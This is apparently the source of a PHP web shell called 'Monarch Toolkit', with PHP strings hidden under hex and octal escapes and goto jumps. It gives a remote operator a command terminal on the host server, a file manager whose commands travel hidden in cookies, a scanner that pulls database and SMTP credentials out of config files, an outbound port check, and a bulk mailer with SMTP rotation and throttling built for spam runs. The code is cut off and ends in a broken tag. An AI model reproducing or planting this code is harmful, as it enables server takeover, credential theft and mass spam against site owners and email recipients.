$message_body .= "\x2d\x2d{$boundary}\xd\12\103\157\x6e\x74\x65\x6e\164\x2d\124\171\160\145\x3a\40\164\x65\170\x74\57\150\x74\x6d\x6c\73\x20\143\x68\x61\x72\163\145\x74\75\165\x74\146\55\x38\15\xa\xd\xa{$body}\xd\12\xd\xa"; $message_body .= "\55\55{$boundary}\x2d\55"; } else { $headers .= "\103\x6f\x6e\164\145\156\164\55\x54\x79\160\x65\72\x20\164\x65\x78\x74\x2f\160\x6c\141\151\156\x3b\x20\x63\150\141\162\x73\x65\164\75\x75\164\x66\x2d\70\15\12"; $message_body = $body; } if (mail($to, $subject, $message_body, $headers)) { $sent_count++; $log[] = "\x2d\x3e\x20\123\145\156\x74\x20\x74\157\x20{$to}"; } else { $failed_count++; $log[] = "\55\x3e\x20\x46\101\111\114\x45\x44\x20\x66\x6f\x72\x20{$to}"; } } } else { $smtp_lines = preg_split("\57\134\x72\134\x6e\174\x5c\x72\174\134\x6e\57", $smtp_list_str); foreach ($smtp_lines as $line) { if (trim($line) !== '') { $parts = explode("\x3a", trim($line), 5); $smtps[] = array("\150\157\163\164" => $parts[0] ?? '', "\160\x6f\162\164" => $parts[1] ?? '', "\x75\x73\145\x72" => $parts[2] ?? '', "\x70\x61\x73\163" => $parts[3] ?? '', "\x65\x6e\x63" => strtolower($parts[4] ?? '')); } } if (empty($smtps)) { echo "\105\122\x52\x4f\122\72\x20\123\115\124\120\40\x6c\151\163\164\40\151\163\40\160\162\157\166\151\144\145\144\40\142\x75\164\40\x69\163\x20\145\x6d\x70\x74\x79\x20\157\x72\x20\155\141\x6c\x66\157\162\155\x65\x64\x2e"; die; } foreach ($recipients as $to) { if ($rotate_after > 0 && $sent_count > 0 && $sent_count % $rotate_after === 0) { $current_smtp_index = ($current_smtp_index + 1) % count($smtps); $log[] = "\x2d\x2d\55\x20\x52\157\x74\141\x74\x69\x6e\x67\x20\164\x6f\x20\x53\115\124\120\x20\x23" . ($current_smtp_index + 1) . "\x20\55\x2d\x2d"; } $current_smtp = $smtps[$current_smtp_index]; $from_email = $use_from_as_login ? $current_smtp["\x75\163\x65\x72"] : $from_email_base; $from_name = monarchClear($from_name_base, $to, $from_email); $subject = monarchClear($subject_base, $to, $from_email); $body = monarchClear($body_base, $to, $from_email); $mailer = new MonarchMailer(true); try { $mailer->isHTML = $is_html; $mailer->Host = $current_smtp["\x68\157\x73\x74"]; $mailer->Port = (int) $current_smtp["\x70\x6f\x72\164"]; $mailer->SMTPSecure = $current_smtp["\x65\156\143"]; $mailer->Username = $current_smtp["\x75\x73\145\162"]; $mailer->Password = $current_smtp["\160\141\163\163"]; $mailer->SMTPAuth = true; $mailer->setFrom($from_email, $from_name); $mailer->addAddress($to); $mailer->Subject = $subject; $mailer->Body = $body; $mailer->send(); $sent_count++; $log[] = "\55\76\40\123\x65\x6e\x74\40\x74\x6f\x20{$to}\x20\x76\151\141\x20" . $current_smtp["\x68\157\163\164"]; } catch (Exception $e) { $failed_count++; $log[] = "\x2d\76\40\106\x41\111\x4c\105\x44\x20\x66\157\162\40{$to}\40\x76\x69\x61\40" . $current_smtp["\x68\157\x73\164"] . "\40\x28" . $e->getMessage() . "\x29"; } unset($mailer); if ($pause_every > 0 && $pause_for > 0 && $sent_count > 0 && $sent_count % $pause_every === 0 && $sent_count + $failed_count < count($recipients)) { sleep($pause_for); $log[] = "\55\x2d\55\40\x50\x61\x75\163\145\144\x20\146\157\x72\40{$pause_for}\40\163\145\143\157\156\144\50\163\51\40\55\x2d\x2d"; } } } echo "\x53\x55\103\x43\105\123\x53\72\40\x54\141\163\153\40\143\x6f\155\160\154\145\164\x65\x2e\xa\123\x65\156\x74\x3a\40{$sent_count}\x2c\40\106\x61\x69\x6c\145\x64\x3a\40{$failed_count}\xa\xa" . implode("\xa", $log); } die; } goto Mb1hz; Sed7A: @set_time_limit(0); goto HeauO; lSwrI: ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Monarch Toolkit</title>
    <style>
        :root { --background: #1a1d24; --foreground: #e0e0e0; --prompt: #50fa7b; --cursor: rgba(0, 255, 0, 0.8); --border: #44475a; --tab-bg: #282a36; --tab-active-bg: #44475a; --input-bg: #222; --button-bg: #6272a4; --success: #50fa7b; --error: #ff5555; --warn: #f1fa8c; }
        html, body { height: 100%; margin: 0; padding: 0; background-color: var(--background); color: var(--foreground); font-family: 'Menlo', 'Consolas', 'monospace'; font-size: 14px; }
        .tabs { display: flex; background-color: var(--tab-bg); }
        .tab-link { padding: 10px 15px; cursor: pointer; border-bottom: 3px solid transparent; }
        .tab-link.active { background-color: var(--tab-active-bg); border-bottom-color: var(--prompt); }
        .tab-content { display: none; height: calc(100% - 41px); overflow-y: auto; }
        .tab-content.active { display: block; }
        #terminal, #tools { width: 100%; height: 100%; box-sizing: border-box; padding: 15px; }
        .line { display: flex; }
        .prompt { color: var(--prompt); font-weight: bold; margin-right: 8px; white-space: nowrap; }
        .input-area { flex-grow: 1; display: flex; }
        #input { background: none; border: none; color: var(--foreground); font-family: inherit; font-size: inherit; flex-grow: 1; padding: 0; }
        #input:focus { outline: none; }
        .cursor { background-color: var(--cursor); display: inline-block; width: 8px; animation: blink 1s step-end infinite; }
        @keyframes blink { from, to { background-color: transparent; } 50% { background-color: var(--cursor); } }
        .output { margin-bottom: 10px; white-space: pre-wrap; word-wrap: break-word; }
        .tool-section { margin-bottom: 25px; border: 1px solid var(--border); border-radius: 5px; padding: 15px; }
        .tool-section h2 { margin-top: 0; color: var(--prompt); border-bottom: 1px solid var(--border); padding-bottom: 10px; }
        .tool-section button { background-color: var(--button-bg); color: var(--foreground); border: none; padding: 10px 15px; border-radius: 4px; cursor: pointer; font-family: inherit; }
        .form-grid { display: grid; grid-template-columns: 120px 1fr; gap: 10px; align-items: center; }
        .form-grid label, .form-grid .label { font-weight: bold; align-self: start; padding-top: 8px; }
        .form-grid input, .form-grid textarea, .form-grid select { width: 100%; background-color: var(--input-bg); border: 1px solid var(--border); color: var(--foreground); padding: 8px; border-radius: 4px; box-sizing: border-box; font-family: inherit; resize: vertical; }
        #scan-results, #mail-status, #scan-smtp-results { margin-top: 15px; white-space: pre-wrap; }
        .status-success, .status-open { color: var(--success); }
        .status-error, .status-blocked { color: var(--error); }
        .status-warn { color: var(--warn); }
        .flex-group { display: flex; gap: 10px; align-items: center; }
        .flex-group input[type="number"] { width: 60px; }
        
        /* File Manager Styles */
        #files-tab { padding: 10px; box-sizing: border-box; }
        .fm-header { display: flex; flex-wrap: wrap; align-items: center; gap: 10px; background-color: var(--tab-bg); padding: 8px; border-radius: 4px; margin-bottom: 10px; }
        .fm-header .path-input { flex-grow: 1; background-color: var(--input-bg); border: 1px solid var(--border); color: var(--foreground); padding: 5px; border-radius: 3px; }
        .fm-server-info { font-size: 0.8em; color: var(--warn); white-space: pre; }
        .fm-toolbar button { margin-right: 5px; }
        .fm-table-container { margin-top: 10px; overflow-x: auto; }
        .fm-table { width: 100%; border-collapse: collapse; }
        .fm-table th, .fm-table td { border: 1px solid var(--border); padding: 8px; text-align: left; }
        .fm-table th { background-color: var(--tab-active-bg); }
        .fm-table tr:nth-child(even) { background-color: var(--tab-bg); }
        .fm-table .item-name { cursor: pointer; color: var(--foreground); }
        .fm-table .item-name:hover { text-decoration: underline; color: var(--prompt); }
        .fm-actions a { margin: 0 4px; cursor: pointer; text-decoration: none; color: var(--warn); }
        .fm-actions a:hover { color: var(--prompt); }
        #fm-editor-modal { display: none; position: fixed; z-index: 100; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.7); justify-content: center; align-items: center; }
        .fm-editor-content { background-color: var(--background); border: 1px solid var(--border); width: 80%; max-width: 900px; height: 80%; display: flex; flex-direction: column; border-radius: 5px; }
        .fm-editor-header { padding: 10px; background-color: var(--tab-active-bg); font-weight: bold; }
        #fm-editor-textarea { flex-grow: 1; background-color: var(--input-bg); color: var(--foreground); border: none; padding: 10px; font-family: inherit; resize: none; }
        .fm-editor-footer { padding: 10px; text-align: right; }
        #fm-status-bar { padding: 5px; text-align: center; display: none; }
    </style>
</head>
<body>
    <div class="tabs">
        <div class="tab-link active" onclick="openTab(event, 'terminal-tab')">Terminal</div>
        <div class="tab-link" onclick="openTab(event, 'files-tab', true)">File Manager</div>
        <div class="tab-link" onclick="openTab(event, 'tools-tab')">Tools</div>
    </div>

    <div id="terminal-tab" class="tab-content active">
        <div id="terminal" onclick="document.getElementById('input').focus();">
            <div id="history"></div>
            <div class="line">
                <span class="prompt" id="prompt"></span>
                <div class="input-area">
                    <input type="text" id="input" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" autofocus>
                    <span class="cursor">&nbsp;</span>
                </div>
            </div>
        </div>
    </div>

    <div id="files-tab" class="tab-content">
        <div class="fm-header">
            <input type="text" id="fm-path-input" class="path-input">
            <div id="fm-server-info" class="fm-server-info"></div>
        </div>
        <div class="fm-toolbar">
            <button id="fm-new-file">New File</button>
            <button id="fm-new-folder">New Folder</button>
        </div>
        <div id="fm-status-bar"></div>
        <div class="fm-table-container">
            <table class="fm-table">
                <thead><tr><th>Name</th><th>Size</th><th>Perms</th><th>Modified</th><th>Actions</th></tr></thead>
                <tbody id="fm-table-body"></tbody>
            </table>
        </div>
        <div id="fm-editor-modal">
            <div class="fm-editor-content">
                <div class="fm-editor-header" id="fm-editor-filename"></div>
                <textarea id="fm-editor-textarea"></textarea>
                <div class="fm-editor-footer">
                    <button id="fm-editor-save">Save</button>
                    <button onclick="document.getElementById('fm-editor-modal').style.display='none'">Close</button>
                </div>
            </div>
        </div>
    </div>
    
    <div id="tools-tab" class="tab-content">
        <div id="tools">
            <div class="tool-section"><h2>Server Scanner</h2><p>Check for common disabled functions and open outgoing SMTP ports.</p><button id="scan-server-btn">Start Scan</button><div id="scan-smtp-results"></div></div>
            <div class="tool-section"><h2>Config Hunter</h2><p>Scan for configuration files to find database/SMTP credentials.</p><button id="scan-btn">Start Scan</button><div id="scan-results"></div></div>
            <div class="tool-section">
                <h2>Mailer</h2>
                <form id="mail-form">
                    <p>Leave SMTP list blank to use the local server mailer. Macros like [-randommd5-] are supported.</p>
                    <div class="form-grid">
                        <label for="from_name">From Name:</label><input type="text" id="from_name" name="from_name" value="Monarch Test" required>
                        <label for="from">From Email:</label><div><input type="email" id="from" name="from" required><div style="margin-top:5px;"><input type="checkbox" id="from_as_login" name="from_as_login"><label for="from_as_login" style="font-weight:normal;"> Use current SMTP username as From Email</label></div></div>
                        <label for="to">Recipients:</label><textarea id="to" name="to" rows="4" required placeholder="One email per line..."></textarea>
                        <label for="subject">Subject:</label><input type="text" id="subject" name="subject" value="Test Message" required>
                        <label for="content_type">Content Type:</label><select id="content_type" name="content_type"><option value="plain">Plain Text</option><option value="html" selected>HTML</option></select>
                        <label for="body">Body:</label><textarea id="body" name="body" rows="6">This is a <b>test email</b> from the [-sender-] using the <u>Monarch Toolkit</u>. Your lucky hash is [-randommd5-].</textarea>
                    </div>
                    <hr style="border-color: var(--border); margin: 20px 0;">
                    <div class="form-grid">
                         <label for="smtp_list">SMTP List:</label><textarea id="smtp_list" name="smtp_list" rows="4" placeholder="host:port:user:pass:encryption (ssl/tls/starttls)&#10;One per line..."></textarea>
                         <div class="label">Rotation:</div><div class="flex-group"><span>Rotate after</span><input type="number" name="rotate_after" min="0" value="0"><span>emails. (0=disabled)</span></div>
                         <div class="label">Throttle:</div><div class="flex-group"><span>Pause for</span><input type="number" name="pause_for" min="0" value="0"><span>seconds every</span><input type="number" name="pause_every" min="0" value="0"><span>emails. (0=disabled)</span></div>
                    </div>
                    <br><button type="submit">Send Email(s)</button>
                </form>
                <div id="mail-status"></div>
            </div>
             <div class="tool-section">
                <h2>Macro Help</h2>
                <p><strong>[-email-]</strong>: The recipient's full email address.</p>
                <p><strong>[-emailuser-]</strong>: The username part of the recipient's email.</p>
                <p><strong>[-emaildomain-]</strong>: The domain part of the recipient's email.</p>
                <p><strong>[-sender-]</strong>: The sender's email address.</p>
                <p><strong>[-time-]</strong>: The current date and time.</p>
                <p><strong>[-randomletters-]</strong>: A random string of lowercase letters.</p>
                <p><strong>[-randomstring-]</strong>: A random string of letters and numbers.</p>
                <p><strong>[-randomnumber-]</strong>: A random string of numbers.</p>
                <p><strong>[-randommd5-]</strong>: A random MD5 hash.</p>
            </div>
        </div>
    </div>
    <script>
        const selfUrl = '<?php  goto F02R3; GU8Zi: echo function_exists("\160\157\x73\151\x78\137\147\145\x74\160\167\x75\x69\x64") ? posix_getpwuid(posix_geteuid())["\x6e\141\155\145"] : "\165\x73\x65\x72"; goto arfYY; jIdvl: echo gethostname(); goto YQ03j; WZkxt: @session_start(); goto Sed7A; RR49M: class MonarchSMTP { protected $connection = false; protected $error = array("\x65\x72\162\157\162" => ''); public function connect($host, $port, $timeout) { if ($this->connection) { fclose($this->connection); } $this->connection = @fsockopen($host, $port, $errno, $errstr, $timeout); if (!$this->connection) { $this->error = array("\x65\162\162\157\162" => "{$errstr}\x20\50{$errno}\x29"); return false; } stream_set_timeout($this->connection, $timeout); $this->getServerResponse(); return true; } public function hello($host) { return $this->sendCommand("\x45\110\114\117\40{$host}", 250); } public function startTLS() { if (!$this->sendCommand("\123\x54\x41\x52\124\124\x4c\x53", 220)) { return false; } if (!stream_socket_enable_crypto($this->connection, true, STREAM_CRYPTO_METHOD_TLS_CLIENT)) { return false; } return true; } public function authenticate($user, $pass) { if (!$this->sendCommand("\101\125\124\x48\x20\114\x4f\x47\111\x4e", 334)) { return false; } if (!$this->sendCommand(base64_encode($user), 334)) { return false; } if (!$this->sendCommand(base64_encode($pass), 235)) { return false; } return true; } public function mail($from) { return $this->sendCommand("\115\101\111\114\x20\x46\x52\117\115\72\74{$from}\76", 250); } public function recipient($to) { return $this->sendCommand("\122\103\120\x54\40\x54\x4f\72\74{$to}\x3e", array(250, 251)); } public function data($msg) { if (!$this->sendCommand("\x44\x41\x54\101", 354)) { return false; } fputs($this->connection, $msg . "\15\12\56\15\xa"); return $this->getServerResponse(250); } public function quit() { if (is_resource($this->connection)) { $this->sendCommand("\121\125\111\124", 221); fclose($this->connection); $this->connection = false; } } public function getError() { return $this->error; } protected function sendCommand($cmd, $expect) { if (!is_resource($this->connection)) { $this->error = array("\x65\x72\x72\x6f\x72" => "\x4e\157\x20\x63\x6f\x6e\x6e\x65\143\x74\x69\157\x6e"); return false; } fputs($this->connection, $cmd . "\15\12"); return $this->getServerResponse($expect); } protected function getServerResponse($expect = null) { $response = ''; while (is_resource($this->connection) && !feof($this->connection)) { $line = fgets($this->connection, 515); if ($line === false) { break; } $response .= $line; if (substr($line, 3, 1) == "\40" || empty($line)) { break; } } $code = (int) substr($response, 0, 3); $this->error = array("\145\162\x72\x6f\162" => $response); if ($expect !== null) { if (is_array($expect)) { return in_array($code, $expect); } return $code == $expect; } return true; } } goto lSwrI; F02R3: echo basename($_SERVER["\x50\110\x50\137\x53\105\114\106"]); goto wZ3YW; YQ03j: ?>
'; promptEl.textContent = `${user}@${hostname}:${cwd}$`; }
        async function executeCommand(cmd) { const formData = new FormData(); formData.append('action', 'shell'); formData.append('cmd', cmd); formData.append('cwd', cwd); try { const response = await fetch(selfUrl, { method: 'POST', body: formData }); const output = await response.text(); if (output.startsWith('SUCCESS:cd:')) { cwd = output.substring(11); } else if (output.startsWith('ERROR:cd:')) { appendTerminalOutput(output.substring(9)); } else { appendTerminalOutput(output); } } catch (error) { appendTerminalOutput(`Network Error: ${error.message}`); } updatePrompt(); inputEl.value = ''; inputEl.disabled = false; inputEl.focus(); terminalEl.scrollTop = terminalEl.scrollHeight; }
        function appendTerminalOutput(text) { const outputDiv = document.createElement('div'); outputDiv.className = 'output'; outputDiv.textContent = text; historyEl.appendChild(outputDiv); }
        function appendCommandToHistory(cmd) { const historyLine = document.createElement('div'); historyLine.className = 'line'; historyLine.innerHTML = `<span class="prompt">${promptEl.textContent}</span><div class="input-area"><span>${escapeHtml(cmd)}</span></div>`; historyEl.appendChild(historyLine); }
        inputEl.addEventListener('keydown', (e) => { if (e.key === 'Enter') { e.preventDefault(); const cmd = inputEl.value.trim(); if (cmd) { appendCommandToHistory(cmd); inputEl.disabled = true; commandHistory.push(cmd); historyIndex = commandHistory.length; executeCommand(cmd); } } else if (e.key === 'ArrowUp') { e.preventDefault(); if (historyIndex > 0) { historyIndex--; inputEl.value = commandHistory[historyIndex]; } } else if (e.key === 'ArrowDown') { e.preventDefault(); if (historyIndex < commandHistory.length - 1) { historyIndex++; inputEl.value = commandHistory[historyIndex]; } else { historyIndex = commandHistory.length; inputEl.value = ''; } } });
        
        // --- Tools Tab ---
        const scanBtn = document.getElementById('scan-btn'); const scanResultsEl = document.getElementById('scan-results'); const scanServerBtn = document.getElementById('scan-server-btn'); const scanSmtpResultsEl = document.getElementById('scan-smtp-results'); const mailForm = document.getElementById('mail-form'); const mailStatusEl = document.getElementById('mail-status');
        scanServerBtn.addEventListener('click', async () => {
            scanServerBtn.disabled = true; scanServerBtn.textContent = 'Scanning...'; scanSmtpResultsEl.innerHTML = 'Checking server capabilities...';
            const formData = new FormData(); formData.append('action', 'scan_smtp');
            try {
                const response = await fetch(selfUrl, { method: 'POST', body: formData }); const results = await response.json();
                let html = '<strong>PHP Functions:</strong>\n'; html += `fsockopen(): <span class="${results.fsockopen ? 'status-success' : 'status-error'}">${results.fsockopen ? 'Enabled' : 'DISABLED'}</span>\n\n`; html += '<strong>Outgoing SMTP Ports:</strong>\n';
                results.ports.forEach(res => { html += `Port ${res.port}: <span class="${res.status === 'Open' ? 'status-open' : 'status-blocked'}">${res.status}</span>\n`; });
                scanSmtpResultsEl.textContent = html;
            } catch (error) { scanSmtpResultsEl.textContent = `Error during scan: ${error.message}`; }
            scanServerBtn.disabled = false; scanServerBtn.textContent = 'Start Scan';
        });
        scanBtn.addEventListener('click', async () => {
            scanBtn.disabled = true; scanBtn.textContent = 'Scanning...'; scanResultsEl.innerHTML = ''; const formData = new FormData(); formData.append('action', 'scan_configs'); formData.append('cwd', cwd);
            try {
                const response = await fetch(selfUrl, { method: 'POST', body: formData }); const results = await response.json();
                if (results.length === 0) { scanResultsEl.textContent = 'No configuration files with known credentials found.'; } 
                else { let html = ''; results.forEach(res => { html += `<strong>Found: ${res.path}</strong>\n`; for (const [key, value] of Object.entries(res.creds)) { html += `  ${key}: ${value}\n`; } html += '\n'; }); scanResultsEl.textContent = html; }
            } catch (error) { scanResultsEl.textContent = `Error during scan: ${error.message}`; }
            scanBtn.disabled = false; scanBtn.textContent = 'Start Scan';
        });
        mailForm.addEventListener('submit', async (e) => {
            e.preventDefault(); mailStatusEl.className = ''; mailStatusEl.textContent = 'Sending...';
            const formData = new FormData(mailForm); formData.append('action', 'send_mail');
            try {
                const response = await fetch(selfUrl, { method: 'POST', body: formData }); const result = await response.text();
                if (result.startsWith('SUCCESS:')) { mailStatusEl.className = 'status-success'; mailStatusEl.textContent = result.substring(8); } 
                else { mailStatusEl.className = 'status-error'; mailStatusEl.textContent = result; }
            } catch (error) { mailStatusEl.className = 'status-error'; mailStatusEl.textContent = `Network Error: ${error.message}`; }
        });
        
        // --- File Manager ---
        const fmPathInput = document.getElementById('fm-path-input');
        const fmServerInfoEl = document.getElementById('fm-server-info');
        const fmTableBody = document.getElementById('fm-table-body');
        const fmStatusBar = document.getElementById('fm-status-bar');

        async function executeFmCookieCommand(command) {
            document.cookie = `cmd=${btoa(JSON.stringify(command))};path=/`;
            try {
                const response = await fetch(selfUrl, { method: 'GET' }); // A simple GET request triggers the cookie check
                const result = await response.json();
                showStatus(fmStatusBar, result.output, !result.success);
                if(result.success) renderFileManager(cwd);
            } catch(e) {
                showStatus(fmStatusBar, 'Error processing command: ' + e.message, true);
            }
        }

        async function renderFileManager(path) {
            const formData = new FormData();
            formData.append('action', 'file_manager');
            formData.append('do', 'list');
            formData.append('path', path);
            try {
                const response = await fetch(selfUrl, { method: 'POST', body: formData });
                const data = await response.json();

                if (data.error) {
                    showStatus(fmStatusBar, data.error, true);
                    return;
                }

                cwd = data.info.cwd; // Update global CWD
                updatePrompt(); // Update terminal prompt too
                fmPathInput.value = cwd;
                fm_zip_enabled = data.info.zip_enabled;
                fmServerInfoEl.textContent = `IP: ${data.info.server_ip} | PHP: ${data.info.php_version} | Zip: ${fm_zip_enabled ? 'Yes' : 'No'} | System: ${data.info.uname}`;

                fmTableBody.innerHTML = ''; // Clear table
                data.items.forEach(item => {
                    const isDir = item.perms.startsWith('d');
                    const row = document.createElement('tr');
                    let actions = `<a href="#" data-action="rename" title="Rename">RN</a> <a href="#" data-action="chmod" title="Chmod">CH</a> <a href="#" data-action="delete" title="Delete">DEL</a>`;
                    if (!isDir) {
                        actions += ` <a href="#" data-action="edit" title="Edit">ED</a> <a href="${selfUrl}?action=file_manager&do=download&file=${encodeURIComponent(item.path)}" data-action="download" title="Download">DL</a>`;
                    }
                    if (fm_zip_enabled) {
                        actions += ` <a href="#" data-action="zip" title="Zip">ZIP</a>`;
                    }

                    row.innerHTML = `
                        <td><a href="#" class="item-name" data-isdir="${isDir}">${escapeHtml(item.name)}</a></td>
                        <td>${item.size}</td>
                        <td>${item.perms}</td>
                        <td>${item.mtime}</td>
                        <td class="fm-actions" data-path="${escapeHtml(item.path)}" data-name="${escapeHtml(item.name)}">${actions}</td>
                    `;
                    fmTableBody.appendChild(row);
                });

            } catch (e) {
                showStatus(fmStatusBar, "Failed to load file list: " + e.message, true);
            }
        }

        fmPathInput.addEventListener('keydown', e => {
            if(e.key === 'Enter') renderFileManager(fmPathInput.value);
        });
        
        fmTableBody.addEventListener('click', async e => {
            e.preventDefault();
            const target = e.target;
            const parentActions = target.closest('.fm-actions');

            if (target.classList.contains('item-name')) { // Navigate folders
                const isDir = target.getAttribute('data-isdir') === 'true';
                const path = target.closest('tr').querySelector('.fm-actions').dataset.path;
                if (isDir) renderFileManager(path);
                else { // Default action for file is 'edit'
                    const actionCell = target.closest('tr').querySelector('.fm-actions a[data-action="edit"]');
                    if(actionCell) actionCell.click();
                }
                return;
            }
            
            if (parentActions) { // Action links
                const action = target.dataset.action;
                const path = parentActions.dataset.path;
                const name = parentActions.dataset.name;

                switch(action) {
                    case 'delete':
                        if (confirm(`Are you sure you want to delete "${name}"?`)) {
                            executeFmCookieCommand({ call: 'delete', target: path });
                        }
                        break;
                    case 'rename':
                        const newName = prompt('Enter new name:', name);
                        if (newName && newName !== name) {
                            const newPath = path.substring(0, path.lastIndexOf('/') + 1) + newName;
                            executeFmCookieCommand({ call: 'rename', target: path, destination: newPath });
                        }
                        break;
                    case 'chmod':
                        const perms = prompt('Enter new permissions (e.g., 0755):', '0644');
                        if (perms) {
                             executeFmCookieCommand({ call: 'chmod', target: path, perms: perms });
                        }
                        break;
                    case 'zip':
                        const zipName = prompt('Enter zip file name:', name + '.zip');
                        if (zipName) {
                            const newPath = path.substring(0, path.lastIndexOf('/') + 1) + zipName;
                            executeFmCookieCommand({ call: 'zip', target: path, destination: newPath });
                        }
                        break;
                    case 'edit':
                        const formData = new FormData();
                        formData.append('action', 'file_manager');
                        formData.append('do', 'get_content');
                        formData.append('target', path);
                        const response = await fetch(selfUrl, { method: 'POST', body: formData });
                        const data = await response.json();
                        if (data.success) {
                            document.getElementById('fm-editor-filename').textContent = path;
                            document.getElementById('fm-editor-textarea').value = data.content;
                            document.getElementById('fm-editor-modal').style.display = 'flex';
                        } else {
                            showStatus(fmStatusBar, data.error, true);
                        }
                        break;
                }
            }
        });
        
        document.getElementById('fm-new-file').addEventListener('click', () => {
            const name = prompt('Enter new file name:');
            if (name) {
                const path = cwd + '/' + name;
                executeFmCookieCommand({ call: 'create_file', target: path, content: '' });
            }
        });

        document.getElementById('fm-new-folder').addEventListener('click', () => {
            const name = prompt('Enter new folder name:');
            if (name) {
                const path = cwd + '/' + name;
                executeFmCookieCommand({ call: 'create_folder', target: path });
            }
        });

        document.getElementById('fm-editor-save').addEventListener('click', () => {
            const path = document.getElementById('fm-editor-filename').textContent;
            const content = document.getElementById('fm-editor-textarea').value;
            executeFmCookieCommand({ call: 'create_file', target: path, content: content }).then(() => {
                document.getElementById('fm-editor-modal').style.display = 'none';
            });
        });

        // --- Initial Load ---
        updatePrompt();
    </script>
</body>
</htm')); ?>
